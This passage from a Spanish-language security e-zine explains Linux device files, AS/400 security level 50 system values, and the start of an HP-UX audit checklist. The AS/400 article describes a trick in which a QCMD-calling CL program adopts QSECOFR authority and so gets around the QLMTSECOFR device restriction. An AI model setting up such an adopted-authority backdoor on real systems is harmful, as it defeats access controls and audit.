 para la  memoria  y  otro  separado  para los  dispositivos. Este esquema es 
 conocido como espaciado separado de direcciones de entrada/salida o  espacio
 de entrada/salida.

 Los  puertos  de  entrada/salida  son  direcciones  mediante  las cuales  el
 procesador  se  comunica  con  los  dispositivos,  ya  sea  leyendo  datos o
 escribiendolos. Un dispositivo puede tener asignadas  una o mas  direcciones
 dentro del espacio, de acuerdo a cuantas necesite.

 4.1.2 INTERRUPCIONES E IRQ'S

 La velocidad con la que los dispositivos trabajan es, en general, ordenes de
 magnitud mas lenta que  la  velocidad de  proceso de  la unidad  central  de
 procesamiento (CPU). Cuando el CPU necesita comunicarse con un  dispositivo,
 inicia la operacion y, en vez de esperar a que el dispositivo termine, sigue
 realizando tareas, aprovechando  el tiempo.  Asi el  dispositivo debe  poder
 comunicarle  al  CPU  que la  operacion de  entrada/salida  finalizo  o  que
 necesita algun tipo de informacion para continuar. Aqui es donde  entran  en 
 juego las interrupciones.

 Una interrupcion es una se~al electronica que se emite desde un  dispositivo
 hacia el CPU para comunicarle  informacion  que  permite  controlarlo.  Para
 emitor  las   interrupciones   existen  lineas  de  pedido  de  interrupcion 
 (Interrupt  ReQuest  Lines)  donde  cada  dispositivo  situa los  pedidos de 
 interrupcion.

 Las arquitecturas Intel 80x86 proveen 15  lineas de  interrupcion  para  los
 dispositivos de entrada/salida. Cada  dispositivo debe  utilizar una  y solo
 una de estas lineas, porque  sino  existen altos riesgos de conflictos en la
 atencion de las interrupciones.

  NOTA: Una caracteristica especial de la arquitectura de las IBM PC's es que
        algunos  dispositivos  trabajan  con  puertos  de  entrada  salida  e
        interrupciones prefijadas.  Por  ejemplo:  el  primer  puerto  serie,
        conocido como COM1, trabaja en el puerto 0x3f8. Otro  ejemplo  es  la
        unidad de discos flexibles que trabaja  sobre la  linea de  pedido de
        interrupcion numero 6.

 4.1.3 ACCESOS DIRECTOS A MEMORIA (DMA)

 Hay  veces  que los  controladores  de  los  dispositivos  necesitan  leer o
 escribir grandes  cantidades de  datos desde o hacia la memoria del sistema. 
 En  estos casos se utilzan los accesos  directos a  memoria  (Direct  Memory 
 Access).  Estos  sirven   para  permitir   que  los   dispositivos   accedan 
 directamente a memoria, pero esto se realiza bajo estricto control del CPU.

 4.2 TRATAMIENTO DE LOS DISPOSITIVOS EN LINUX

 En los S.O. de la famila UNIX todos los dispositivos de  entrada/salida  son
 tratados como archivos que forman parte del sistema de archivos. En  general
 estos archivos se encuentran en el directorio /dev, pero esto puede depender
 del sistema.

 Estos archivos, llamados  "archivos  de  dispositivos",  son creados  por el
 nucleo y son indespensables para el funcionamiento del sistema.  Uno  de los
 principales objetivos es manejar los dispositivos como archivos  es  que  se
 abstrae y simplifica  el  tratamiento  de los  mismos  para el  usuario. Los
 archivos especiales de dispositivos se  manejan con  las mismas  operaciones
 que se realizan sobre los archivos comunes, pero al tratarse de  un  archivo 
 de dispositivo el sistema se encarga de realizar las tareas necesarias  para
 comunicarse con el dispositivo. Esto se realiza por medio  de un  "manejador 
 de dispositivo" que forma  parte del  nucleo y  conoce los  detalles de como 
 tratar con el dispositivo en cuestion.

 Otra de las ventajas de este  esquema de  tratamiento de dispositivos es que 
 se pueden fijar permisos sobre  los dispositivos  utilizando  el esquema  de
 usuarios, grupos y permisos ya  analizado. De esta forma, podremos hacer que
 un grupo de usuarios pueda usar una impresora, que otro grupo pueda usar una
 red, o inclusive denegar el acceso a un disco a un usuario determinado, etc.

 Los archivos de dispositivos  tienen  un  atributo especial que determina si
 son archivos de dispositivos  de bloque  o de  caracter.  Esto es  necesario
 para que el sistema sepa como tratar a cada uno.

 Como es posible que existan varios  dispositivos  de  entrada/salida  de las
 mismas caracteristicas (podemos tener varios discos,  varias  placa de  red,
 etc.) se crean grupos de  usuarios  para cada  clase de  dispositivo  y hace
 que  los  archivos  pertenezcan  a  esos  grupos.  Por  ejemplo:  todos  los
 dispositivos de disco del sistema  son  archivos  que  pertenecen  al  grupo
 "disk, etc."

 4.2.1 ARCHIVOS DE LOS DISPOSITIVOS MAS COMUNES

  * DISCOS MFM, RLL O IDE  (EIDE): La interfaz IDE en  Linux soporta  hasta 6
    interfases con soporte para dos discos  cada una. Se  denominan primaria,
    secundaria,  terciaria,  etc. y  a los discos  se los  denomina maestro y
    esclavo. Tenemos un maestro y un esclavo por  cada interfaz.  Sus nombres
    son:

       |-----------------------|------------------------|
       | Interfaz              | Archivo de dispositivo |
       |-----------------------|------------------------|
       | Primaria - Maestro    |      /dev/hda          |
       | Primaria - Esclavo    |      /dev/hdb          |
       | Secundaria - Maestro  |      /dev/hdc          |
       | Secundaria - Esclavo  |      /dev/hdd          |
       | ...                   |      ...               |
       |_______________________|________________________|

        NOTA: Si  uno  de los  lugares en  las interfases es ocupado  por un
              CD-ROM, se le asigna un archivo correspondiente a la interfaz,
              pero ademas se crea un link  simbolico llamado  /dev/cdrom que
              apunta a la interfaz que corresponda al CD-ROM.

  * DISCOS SCSI: Linux tiene soporte para 128 discos SCSI y sus archivos son:

         |-----------------|------------------------|
         | Numero de disco | Archivo de dispositivo |
         |-----------------|------------------------|
         | Disco SCSI 1    |     /dev/sda           |
         | Disco SCSI 2    |     /dev/sdb           |
         | ...             |     ...                |
         | Disco SCSI 26   |     /dev/sdz           |
         |-----------------|------------------------|
         | Disco SCSI 27   |     /dev/sdaa          |
         |-----------------|------------------------|
         | Disco SCSI 28   |     /dev/sdab          |
         |-----------------|------------------------|
         | ...             |     ...                |
         | Disco SCSI 128  |     /dev/sddx          |
         |_________________|________________________|

  * PARTICIONES: Cada disco puede estar particionado. Para  referirnos a las
    particiones solo agregamos el numero de la particion correspondiente, al
    nombre del archivo que representa el disco. Los nombres  se forman de la
    siguiente forma: /dev/hd?n y /dev/sd?n reemplazando por "?" la letra del
    disco adecuado y por "n" el numero de particion correspondiente.

        NOTA: En particiones del estilo MS-DOS (tipicamente usadas por Linux
        en sistemas i386) los  numeros  del 1 al 4  representan  particiones
        primarias y del 5 en adelante particiones logicas.

  * UNIDADES DE DISQUETTES:  Se  soportan  dos  controladoras de unidades de
    disquettes con hasta 4 unidades por controladora.

            |----------------------------|------------------------|
            | Controladora - Disquettera | Archivo de dispositivo |
            |----------------------------|------------------------|
            | Controladora 1 - Unidad 1  |         /dev/fd0       |
            |       "        -   "    2  |         /dev/fd1       |
            |       "        -   "    3  |         /dev/fd2       |
            |       "        -   "    4  |         /dev/fd3       |
            |       "      2     "    1  |         /dev/fd4       |
            |       "      "     "    2  |         /dev/fd5       |
            |       "      "     "    3  |         /dev/fd6       |
            |       "      "     "    4  |         /dev/fd7       |
            |____________________________|________________________|

  * CONSOLAS VIRTUALES: Son 64 consolas y se nombran /dev/ttyn donde "n" es
    el numero de la consola virtual correspondiente.

  * PUERTOS SERIE, MODEMS Y MOUSES: Se tiene soporte para 64 puertos serie y
    se nombran como /dev/ttySn donde, de nuevo, "n" es el numero del puerto.

        NOTA: En sistemas basados en  MS-DOS  los  puertos  serie se nombran
        COM1, COM2, etc La correspondencia de esos puertos con los de  Linux
        es la siguiente:
             ________________________________
             |   MS-DOS    |   Linux        |
             |-------------|----------------|
             |  COM1       |   /dev/ttyS0   |
             |  COM2       |   /dev/ttyS1   |
             |  COM3       |   /dev/ttyS2   |
             |  COM4       |   /dev/ttyS3   |
             |_____________|________________|
                            
    Los dispositivos de puertos serie pueden ser utilizados, entre otros
    dispositivos, por puertos serie fisicos o por modems. Si el modem es
    externo, entonces se conecta a uno de los puertos serie y se crea un
    link   simbolico  /dev/modem  que  apunte  al  puerto  serie  fisico
    correspondiente. Si el modem es interno entonces  utilizara  uno  de 
    los puertos que se encuentren disponibles  (que  no esten utilizados 
    por puertos serie fisicos)  y  el  link  simbolico debera apuntar al 
    puerto "logico" que se utilice.

    Si se utiliza  un mouse serial  entonces  se  crea un  link  simbolico
    /dev/mouse  que apunta  al puerto  serie en el  cual esta conectado el 
    mouse. Si no se utiliza un  mouse serial  entonces  se pueden utilizar
    los siguientes dispositivos, dependiendo del tipo del mouse:

            |-------------------------------|------------------------|
            | Mouse                         | Archivo de dispositivo |
            |-------------------------------|------------------------|
            | Mouse PS/2                    |   /dev/psaux           |
            | Mouse Logitech de bus         |   /dev/logibm          |
            | Microsoft InPort mouse de bus |   /dev/inportbm        |
            | Ati XL mouse de bus           |   /dev/atibm           |
            | Mouse Atari                   |   /dev/atarimouse      |
            | Mouse Sun                     |   /dev/sunmouse        |
            | Mouse Amiga                   |   /dev/amigamouse      |
            |_______________________________|________________________|

  * PUERTOS PARALELOS: Pueden ser 3 y sus nombres son los siguientes:

          |--------------------------------|------------------------|
          | Puerto paralelo                | Archivo de dispositivo |
          |--------------------------------|------------------------|
          | Primer puerto paralelo (0x3BC) |       /dev/lp0         |
          |    "     "       "     (0x378) |       /dev/lp1         |
          |    "     "       "     (0x278) |       /dev/lp2         |
          |________________________________|________________________|

  * TECLADO: El teclado se maneja con el dispositivo /dev/kbd

  * PLACAS DE SONIDO: Los dispositivos relacionados con las placas de sonido
    son los siguientes:

    |-----------------------------------------------|------------------------|
    | Dispositivo                                   | Archivo de dispositivo |
    |-----------------------------------------------|------------------------|
    | Control de mezcladora                         |     /dev/mixer         |
    | Secuenciador de audio                         |     /dev/sequencer     |
    | Puertos midi                                  |     /dev/midinn4       |
    | Audio digital                                 |     /dev/dsp5          |
    | Audio digital compatible con formato SUN      |     /dev/audio         |
    | Informacion del estado de la placa de sonidos |     /dev/sndstat       |
    |_______________________________________________|________________________|

  * JOYSTICK: Los dispositivos de joystick  se  nombran /dev/jsn,  para  los
    joysticks analogicos y /dev/djsn para los joysticks digitales; "n" es el
    numero de joystick.

  * INTERFASES DE RED: Las interfases de red mas utilizadas son las  Punto a
    Punto (PPP) o las interfases Ethernet. Los dispositivos para  las mismas
    son: /dev/pppn para las interfases PPP y  /dev/ethn para las  interfases
    Ethernet; "n" es el numero de interfase.

  * CD-ROM'S ESPECIALES:

        |------------------------|-------------------------|
        | CD-ROM                 | Archivo de dispositivo  |
        |------------------------|-------------------------|
        | Sony CDU-31A/CDU-33A   |   /dev/sonycd           |
        | Sony CDU-535           |   /dev/cdu535           |
        | Goldstar               |   /dev/gscd             |
        | Optics                 |   /dev/optcd            |
        | Sanyo                  |   /dev/sjcd             |
        | Hitachi                |   /dev/hitcd            |
        | Mitsumi                |   /dev/mitcd            |
        | Panasonic/SoundBlaster |   /dev/sbpcdn6          |
        | Aztech                 |   /dev/aztcd            |
        |________________________|_________________________|
        
  [NdE: En la proxima  entrega hablaremos de programas y procesos, 
        interaciones con el sistema, algunos comandos utiles ... ]


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

         ..--:: 07. AS/400, Seguridad Nivel 50 y Algo mas... ::--..
                                by Taker

Hi.. 

Otra  vez  aqui a aburrirlos con uno de mis articulos sobre AS/400, ha pasado 
un buen tiempo  desde  el numero anterior donde nos quedamos con el nivel 40, 
esta vez veremos el nivel 50,  completo (o eso espero, pues ya voy tarde para
la salida del e-zine) y un truquillo que dejare para el final. ;)

Como ya vimos, el nivel 40 de  seguridad, implementa  seguridad a nivel de la 
integridad  del  sistema.  Ahora  veremos  que el nivel 50  trae  consigo  la 
implementacion de las funciones necesarias para  cumplir  con el nivel C2 del 
DoD (o Departamento de Defensa ;)). De hecho alguna vez escuche que el DoD le 
pidio a IBM estas caracteristicas para sus sistemas, IBM las desarrollo y las 
presento, cuando el DoD las vio, dijeron que eso era mucho...  XDDD nadie los 
entiende.

Hay que anotar, que al implementar el nivel 50 de seguridad el sistema tendra 
mucho  mas  trabajo,  se  volvera  mas  lento  etc, esto porque a la carga de 
trabajo  normal  que  utilizan los programas, el sistema  realiza  para  cada 
trabajo, un chequeo de cada una de las instrucciones, para que estas no vayan 
a hacer cosas que comprometan la  seguridad  del mismo. Es por esto que no se 
recomienda implementarlo a no ser que sea estrictamente necesario...

Cuando  se  utiliza  el  nivel  50  de  seguridad,  el  sistema  valida  cada 
parametro,  impone restriccion  a los mensajes, remueve los punteros  de  los 
mensajes, evita  la  modificacion  de  los  bloques  de  control  y  verifica 
constantemente  la Libreria QTEMP (imagino que por el nombre sabran para  que 
se utiliza.)

Veamos que hace cada una de estas validaciones:

Validacion de parametros:  Cada vez que una aplicacion de usuario llama algun
programa del OS/400 que este corriendo a nivel de sistema, el OS/400 verifica
cada parametro que se pase entre los programas, para evitar el compromiso del
sistema.

Restriccion  de  los  mensajes: Ya habiamos visto que todos los objetos en el 
AS/400  pertenecen  al dominio del systema "*SYSTEM" o al dominio del usuario 
"*USER".  La  mayoria de los objetos suministrados por IBM son de dominio del 
sistema,  y  TODOS  los  objetos  creados  por  los  usuarios y algunos pocos 
suministrados  por  IBM  son  de  dominio  del Usuario, lo mismo pasa con los 
programas,  ahora  tenemos  que, los programas de usuario solo pueden accesar 
objetos de dominio de usuario, pero los programas del sistema, pueden accesar  
ambos  tipos de objetos, esto significa que un programa de usuario solo puede 
accesar objetos del sistema utilizando algunas API's del sistema, el nivel 50 
de  seguridad impone las siguientes restricciones para evitar compromisos del 
sistema:

Un  programa  en  estado  de sistema puede enviar cualquier tipo de mensaje a 
cualquier programa corriendo a nivel de usuario o a nivel de sistema.

Cualquier  programa  de  usuario  puede enviar cualquier mensaje unicamente a 
programas que esten corriendo a nivel de usuario.

Un programa de usuario, puede enviar un mensaje "nonexception" (lease, que no 
afecte su comportamiento), a cualquier programa a nivel de sistema.

Un  programa de usuario puede enviar mensajes tipo excepcion a un programa de 
sistema,  solo  si  el  programa  de sistema lo solicita, o si el programa de 
sistema llama al programa de usuario.

Adicional  a  esto ,  el  OS / 400  elimina los punteros que se utilizan para 
reemplazo de textos en  los mensajes  enviados a las  aplicaciones de usuario 
desde  otro  job  (trabajo),  esto lo hace para evitar que la recepcion de un 
trabajo  que este utilizando esos punteros comprometa la seguridad y se salte 
las auditorias del sistema.

Prevencion contra la modificacion de bloques de control. En este nivel, no se 
permite  la  modificacion de bloques internos de control (Ej. Las estructuras 
internas  disponibles  para el sistema operativo). Estas restricciones pueden 
dejar  inoperables   algunas   utilidades,  y  es  mejor  contactar  con  los 
desarrolladores de las aplicaciones entes de cambiar al nivel 50.

Mantenimiento  de  la libreria QTEMP. Si, es algo asi como el directorio TEMP 
del  windows.  Esta,  aparentemente  es  una  libreria donde se almacenan los 
archivos  temporales.  La  libreria  QTEMP  es  unica  para  cada trabajo del 
sistema,  y se pueden accesar los objetos de ella unicamente desde su trabajo 
asociado, y  cuando ese trabajo termina de forma normal, todos los objetos de 
ella,  y ella misma desaparecen (son eliminadas, que esto no es The X Files.. 
XDD).  Por  lo menos esa es la idea de su implementacion (Igual ocurre con la 
de windows... pero aun asi, dense una vuelta por su directorio temporal a ver 
si esta vacio).

El  hecho,  es  que  si  no se esta corriendo bajo el nivel 50, cada libreria 
QTEMP  permanece  en  el  sistema.  Cuando  un  trabajo  comienza, el sistema 
operativo crea una libreria QTEMP para ese trabajo, y direcciona la libreria, 
y  cada  objeto  en  ella  hacia  una  direccion raiz en el sistema (valga la 
redundancia).  Si  el  trabajo, o el sistema terminan de forma anomala, en el 
proximo  IPL,  el  sistema  busca  las  librerias  y objetos de  ella por sus 
direcciones y los elimina del sistema. Aunque internamente sean permanentes.

Con  la  implementacion  del  nivel 50, estas librerias son tratadas de forma 
diferente,   ya   que   el  sistema  no  almacena  las  direcciones  raiz,  y 
efectivamente  trata  estas  librerias  temporales como librerias temporales, 
asi como los objetos de cada una de ellas. El resultado es que si un trabajo, 
o  el sistema mismo, terminan de forma anomala, el sistema no puede localizar 
las  direcciones  (que  en  realidad no existen), y la biblioteca QTEMP y sus 
objetos  permanecen  en  el  sistema.  En este caso, es necesario utilizar el 
comando  RCLSTG  (Reclamar  Almacenamiento),  para  recuperar los objetos que 
estan perdidos y borrarlos manualmente.

Valores Generales del sistema
******* ********* *** *******

Ahora  veremos los valores generales del sistema (los que tienen que ver algo 
con  la  seguridad),  como  el control de contrase~as, y los que controlan la 
auditoria del sistema. (Para  ver  y  modificar  estos  valores  es necesario 
entrar a valores del sistema utilizando el comando wrksysval).

Estos son los valores y algunas recomendaciones que hace la gente de IBM.

QALWOBJRST ** Permite la restauracion de objetos que comprometan la seguridad 
(Programas  del  sistema) --  Este  valor  de sistema determina, cuando se le 
permitira  a  alguien  restaurar  objetos  del  sistema. El valor por defecto 
(*all) permite que cualquier objeto, incluyendo los que pueden comprometer la 
seguridad, puedan ser restaurados por un usuario con los permisos adecuados.

Se  puede  especificar  el  valor *NONE para prevenir la restauracion de esos 
objetos   de  sistema.  Se  puede  especificar  *ALWSYSST  para  permitir  la 
restauracion  de  los  objetos  de  sistema,  o se puede especificar el valor 
*ALWPGMADP  para  permitir la restauracion de programas que tenga el atributo
de adopcion de autoridad.

Para tener un maximo control se debe ajustar este valor a *NONE. Sin embargo, 
si frecuentemente se restauran objetos de adopcion de autoridad en el sistema 
(pej.  cuando  se  distribuye  software  a  varios  sistemas AS/400), se debe 
ajustar  el  valor a *ALWPGMADP, y examinar cuidadosamente cualquier software 
que haya sido restaurado por otros a su sistema.

Tambien  hay que tener en cuenta, antes de instalar un programa bajo licencia 
o al aplicar PTF's (los PTF's son como los parches de windows, creo que ya lo 
habia dicho,  pero  igual  vale),  se  debe  cambiar este valor a *ALL. De lo 
contrario,  la  operacion  puede  fallar  (imagino  que  sabran el porque). Y
despues de terminar el trabajo cambiar el valor al que estaba anteriormente.

QALWUSRDMN **  Permitir  objetos de dominio de usuario en bibliotecas -- Este 
valor  especifica  el nombre de las librerias que permitiran tener objetos de 
usuario  en  ellas, el valor por defecto es *ALL (todas), y es aceptable para 
sistemas que no requieren cumplir con el nivel C2 de seguridad. El valor *DIR 
permite  la  estadia  (por  decirlo  de  algun modo) de objetos de dominio de 
usuario  en todos los directorios del sistema. Aquellos que deben cumplir con 
el  nivel  de  seguridad  C2,  tiene  que utilizar el nivel de seguridad 50 y 
especificar  la  libreria QTEMP para el valor QALWUSRDMN. El sistema no puede 
auditar  el movimiento de informacion desde y hacia los objetos de dominio de 
usuario.  En  el  nivel  de  seguridad  50,  la  libreria  QTEMP es un objeto 
temporal,  lo  cual previene el intercambio de informacion confidencial entre 
usuarios.

A  no  ser  que  se  deba  cumplir  con  el  Nivel  C2  de seguridad, se debe 
especificar  *ALL  para el valor  QALWUSRDMN. Si se especifica cualquier otro 
valor  (diferente  a *ALL), se debe incluir la biblioteca QRCL en la lista de 
librerias.  Cuando  se ejecuta el comando RCLSTG, el sistema necesitara mover 
(o  puede  hacerlo),  *USRSPC  (espacio  de  usuario),  *USRIDX  (Indices  de 
usuarios)  y  *USRQ  (Colas  de  usuario)  a la libreria QRCL. Por razones de 
seguridad  se  debe  cambiar la autoridad publica a *EXCLUDE para la libreria 
QRCL.

QAUTOVRT **  Creacion  automatica  de  dispositivos  virtuales  --  El  valor 
QAUTOVRT  determina el numero de dispositivos virtuales que seran creados por 
el  sistema  cuando sea requerido, es decir, si se conecta una pantalla, o si 
se  hace  una  peticion  telnet  al  OS/400,  este  automaticamente  crea  un 
dispositivo  virtual,  que es el que permite la conexion entre una pantalla o 
una  terminal, con el sistema OS/400 (esos mismos que vimos por alla en una R 
anterior,  los DSP010101 etc...). El valor de 0, implica que los dispositivos 
virtuales  no se crearan automaticamente, dando asi, la seguridad de tener el 
control  de  los  dispositivos  que  se  pueden conectar al sistema. Un valor 
diferente  de  0, determina el numero maximo de dispositivos virtuales que se 
conectaran al sistema.

QCRTAUT **  Autorizacion  publica  por omision al Crear. -- Este parametro el 
valor por defecto de los permisos publicos para todos  los objetos creados en 
una libreria. El parametro permite los siguientes valores:

*SYSVAL		Utiliza el valor especificado en QCRTAUT
*ALL		La autorizacion de uso publico por omision es *ALL
*CHANGE		La autorizacion de uso publico por omision es *CHANGE
*USE		La autorizacion de uso publico por omision es *USE
*EXCLUDE	La autorizacion de uso publico por omision es *EXCLUDE

El  valor  por  defecto  del parametro CRTAUT es *SYSVAL. Por esto, cuando se 
crea  una biblioteca y no se especifica un valor para el parametro CRTAUT, la 
autoridad  publica  por  omision  para  los  nuevos  objetos  creados  en esa 
biblioteca  seran los especificados en el parametro CRTAUT en los valores del 
sistema.

Un cambio de valor del sistema QCRTAUT a un valor mas restrictivo como *USE o 
*EXCLUDE,  limitara  el  acceso  de  los  nuevos  objetos  creados. Puede ser 
necesario  que  el  propietario de  los objetos o el responsable de seguridad 
(QSECOFR)  tenga  que  otorgar  autorizacion adicional antes de que el objeto 
pueda utilizarse.

QDSPSGNINF ** Control  de informacion de pantalla de Inicio de Sesion -- Este 
valor  del  sistema  controla si el usuario ve una pantalla informativa en el 
inicio  de  sesion, esta pantalla le indica la fecha y hora del ultimo inicio 
de  sesion  y  el  numero  de intento de inicio de sesion no validos desde el 
ultimo inicio de sesion. Sus posibles valores son:

0 No se visualiza la Informacion de inicio de sesion.
1 Se visualiza la informacion de inicio de sesion.

QINACTITV **  Tiempo  de espera de trabajo Inactivo. -- Determina la cantidad 
de  tiempo  en  minutos, en que una pantalla puede permanecer activa antes de 
que  el  sistema  envie  un  mensaje a la cola de mensajes especificada en el 
parametro  QINACTMSGQ,  desconecte  el  trabajo, o termine el mismo. Si en el
parametro  QINACTMSGQ esta el valor *DSCJOB, el trabajo se desconectara (esto 
significa que no se cancelara, asi, se desconecta al usuario, pero la proxima 
vez  que  inicie una sesion, podra seguir con su trabajo, bueno, esto tambien 
depende  del  tiempo que el trabajo este desconectado, si sobrepasa un limite 
de tiempo especificado en QDSCJOBITV, el trabajo se cancelara).

QLMTDEVSSN ** Limite  de  sesiones de dispositivo -- Determina la cantidad de 
veces que  un  usuario puede estar loggeado en el sistema simultaneamente. El 
valor 0 permite a un usuario estar loggeado la cantidad de veces que desee. 

El valor 1 restringe al usuario a estar loggeado una sola vez. Este parametro 
controla la cantidad de concurrencias de un usuario en el sistema, pero puede 
ser saltado por el parametro LMTDEVSSN del perfil de usuario.

QLMTSECOFR ** Limitar acceso a dispositivos al responsable de seguridad -- 
Este  parametro  determina  los dispositivos que pueden ser accesados por los 
usuarios  con  autoridades  especiales  de  *ALLOBJ  o  *SERVICE (Que incluye 
QSECOFR  y  QSRV).  Si  el  valor  esta en 0, los usuarios con autoridades de 
*ALLOBJ y/o *SERVICE podran utilizar cualquier estacion conectada al sistema. 

Si  el valor esta en 1, estos usuarios, solo podran acceder al sistema, desde 
dispositivos  que  esten  especificamente  autorizados.  En la mayoria de los 
casos, no  es  necesario que los administradores de seguridad, o los perfiles 
con  atributos de *ALLOBJ accesen estaciones de trabajo, por fuera del centro 
de computo.

Aunque  se nota que es efectiva en cuanto seguridad, se puede notar que tiene 
un  problema  operativo, pues a veces es necesario viajar a un sitio remoto y 
encontrarse  con que es necesario utilizar un perfil de usuario con atributos 
especiales, asi pues, se pueden hacer dos cosas:

Primero:  Se  puede  autorizar una de las estaciones remotas para que permita 
acceder a usuarios con permisos especiales.

Segundo: (Esta  es  mejor, pues si uno no se ha preparado para el viaje, como 
suele suceder)

Crear un usuario con clase *USER y MAIN para el menu inicial.
Con ese perfil de usuario crear un CL (Programa) que tenga lo siguiente:
     PGM
     CALL QCMD
     SIGNOFF
     ENDPGM

Despues  de  esto,  firmando  como QSECOFR compilar el programa, con USRPRF a 
(*OWNER), con eso se adoptaran los permisos especiales de QSECOFR, despues de 
esto,  autorizar  al  perfil  de usuario creado anteriormente, como unico que 
puede ejecutar el CL.

En el  sitio  remoto,  se utiliza el perfil de usuario creado para acceder al 
sistema, luego se llama al CL, y este al ejecutarse entrara a una pantalla de 
comandos, con la diferencia que esta tendra permisos de QSECOFR. ;)

Ahora, es bueno  recordar, que la contrase~a  para este usuario no debe estar
disponible a la vista de personas no deseadas...

QMAXSIGN **  Numero  Maximo de intentos de loggeo -- Este valor, junto con el 
QMAXSGNACN determina el numero maximo de intentos fallidos de loggeo antes de 
tomar una accion al respecto (estas acciones van desde deshabilitar el perfil 
de usuario, hasta deshabilitar el dispositivo desde donde  se esta intentando 
la entrada.

Si  se le da un valor numerico al valor QMAXSIGN, el sistema envia un mensaje 
a la  estacion,  avisando  que  el  proximo  intento fallido la deshabilitara 
(Cuando solo quede un intento).

Poner *NOMAX a este valor, hace que el sistema sea vulnerable a un ataque por 
fuerza bruta.

El valor QMAXSGNACN determina la accion que tomara el sistema cuando se halla 
llegada al numero limite de intentos, estos valores pueden ser:

        1 Deshabilitar el dispositivo (Pantalla)
        2 Deshabilitar el perfil de usuario
        2 Deshabilitar el dispositivo  y el perfil de usuario

Will Continue...

Buff, muchas ocupaciones, mucho que hacer, y muy poco tiempo... 

En  la  siguiente  edicion  continuare  con  esta  pequeña  introduccion a la 
seguridad  en  nivel 50 en AS/400, aunque la verdad, me parece muy exagerada, 
pero siempre es bueno darle un vistazo a todo eso...

Ahora,  los  que  me preguntan por mail, que donde pueden conseguir el OS/400 
para instalarlo en el PC, mmmm... pues Creo que viene en CD's... pero No creo 
que les sirva de mucho...

See Ya...

Taker
CDLR - Sec. Team (Igual podria ser .. otra cosa...)
atrophiedmind@tutopia.com

Pd. There's no Pd's...

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                      ..--:: 08.1/3 Auditoria HP ::--..
                                 by cucumber

	Este mas que un articulo es una ayuda para quienes  quieran hacer una
auditoria  a  un HP/UX  y al  mirarlo  solo vean  un  sistema UNIX arcaico en
apariencia...  bueno, lo  traduje  del ingles  ya  que  no  encontre nada  en
castellano  de  utilidad.  Quiero dejar  en claro  que no  es  mio  el  texto
original,  sino que  lo  saque  de  http://www.auditnet.org en su  version en
ingles.

Pues bien, aca vamos! Cualquier sugerencia,  direcciones buenas de auditorias
u otros, a cucumber@webhost.cl

Chao!


			Auditoria HP/UX
			---------------
	
I. Preliminar:

A. Obtener una lista de la gente responsable de la  operacion de las maquinas
   HP.
B. Obtener   cualquier  dato   de  procedimientos  de   seguridad  y  control
   existentes.
C. Obtener la configuracion de la red.
D. Obtener la lista de aplicaciones que corren en la maquina.
E. Obtener la descripcion del trabajo del Administrador.


II. Pasos de la auditoria:

A. Revisar el dise~o de los criterios de seguridad.
B. Determinar  como se controla  el acceso a las  maquinas, el  manejo de las
   bases de datos, etc.
C. Determinar quien tiene el rol de administrador.
D. Determinar  que documentos  estandares se estan ocupando (por  ejemplo ISO
   12000, etc.)
E. Revisar el manejo y construccion de passwords.
F. Revisar las guias existentes para usuarios, grupos y funciones.


III. Seguridad fisica:

A. Revisar la configuracion de la red para asegurarse de que todo esta seguro
   (HUB's, routers, etc..).
B. Determinar  quien es responsable  y que  documentacion es  necesaria  para
   hacer cambios de estructura en la red.
C. Asegurarse de que solo el administrador tenga acceso a la consola.


IV. Administracion del sistema:

A. Identificar a los administradores ($ grep :0: /etc/passwd)
B. Determinar que cada administrador tenga el requerido nivel de autoridad.
C. Determinar los procedimientos para los cambios de usuarios, programas, etc
D. Determinar la persona apropiada para el monitoreo de servidor de archivos.
E. Determinar la persona apropiada para hacer shutdown y backup.
F. Determinar si los backup quedan en un lugar seguro.
G. Determinar quien esta manteniendo las licencias.


V. Seguridad del sistema:

En  HP/UX  la interfaz  de  administracion  se llama  SAM y se  encuentra  en
/usr/bin/sam.

A. Durante la instalacion inicial, ¿el administrador hizo  una descripcion de
   los  archivos de  produccion (PDFS)?  ¿Se usan para certificar  cambios no
   autorizados de los archivos?
   Revisar mkpdf y pdfck
B. ¿ El  sistema   corre  en   modo  seguro ?   Si  es  asi,   debe   existir
   /.secured/etc/passwd.  En  /etc/passwd  deja  un  *  donde iba el password
   encriptado. El hacer eso, fuerza a crear un ID de auditoria.
C. Determinar si la  auditoria esta activada. Use SAM seleccionando "Auditing
   and Security"  revisando  el estado de usuarios, eventos,  etc. Audite los
   datos recolectados en /.secure/etc/auditlog_1
D. Revisar los logs de auditoria para determinar eventos no autorizados.
E. Revisar /etc/inittab
F. Revisar todos los scripts de inicio (rc)
G. Revisar sulog para ver actividades sospechosas.
H. Asegurese de que se hace backup y donde se guarda (en un lugar seguro).


VI. Seguridad de cuentas:

Revisar los permisos de control de acceso (ACL).

$ lsacl memos
(jose.adm,rw-) (ana.%,r-) (%.acct,r--) (%.%,---) memos

chmod solo  cambia los  permisos para  el due~o (owner) y el  grupo primario,
para eso se usa chmod -A para usar ACL.

$ ll -d precios
drwx------ + 1 pedro adm 345 jun 5 7:15:23 precios

El '+' significa que un directorio tiene ACL activados.


VII. Seguridad de la red:

A. Revisar /etc/exports para ver que sistemas de archivos pueden ser montados
   por  otras  maquinas.  Revisar  las  maquinas  que  pueden  hacer  eso  en
   /etc/netgroup.
   Cada  linea  tiene  dos campos: El  nombre  del sistema  de archivo  a ser
   exportado. El segundo campo y los siguientes nombran el sistema al cual el 
   sistema  de archivos  puede ser exportado.  Si hay menos de dos campos, el
   sistema de archivos puede ser exportado a todo el mundo.
B. Revisar  /etc/hosts.equiv para  verificar los  nombres de computadores que
   tienen permiso de conectarse a la maquina sin password.
C. Determinar si  algun dominio administrativo  ha sido creado.  Verificar la
   consistencia de los nombres de usuario, etc. En el dominio.
D. Verificar los permisos en el control de archivos de red. Los archivos 
   mostrados a continuacion NUNCA deben estar con permisos de escritura:

     networks: Nombres de redes y sus direcciones.
     hosts: Host de la red y sus direcciones.
     services: Base de datos de los servicios.
     exports: Servicios a exportar via NFS.
